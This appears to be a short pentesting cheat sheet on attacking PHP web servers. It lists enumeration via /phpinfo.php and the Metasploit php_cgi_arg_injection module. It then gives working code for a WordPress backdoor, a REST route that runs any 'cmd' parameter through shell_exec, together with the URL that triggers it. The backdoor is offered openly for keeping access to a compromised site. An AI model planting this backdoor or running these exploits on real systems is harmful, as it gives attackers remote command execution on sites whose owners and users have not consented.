**Enumeration**
- If u see a .php extension, see the /phpinfo.php directory.

**Exploitation**
- use exploit/multi/http/php_cgi_arg_injection 
- or use any of the other exploits from searchsploit result of 'php cgi'
- Can use this backdoor for a compromised wordpress website:
// --- BACKDOOR START ---
add_action('rest_api_init', function () {
    register_rest_route('bd/v1', '/cmd', array(
        'methods' => 'GET',
        'callback' => function ($request) {
            $cmd = $request->get_param('cmd');
            return shell_exec($cmd);
        }
    ));
});
// --- BACKDOOR END ---
- to access this use: http://wordpress.local/wp-json/bd/v1/cmd?cmd=whoami
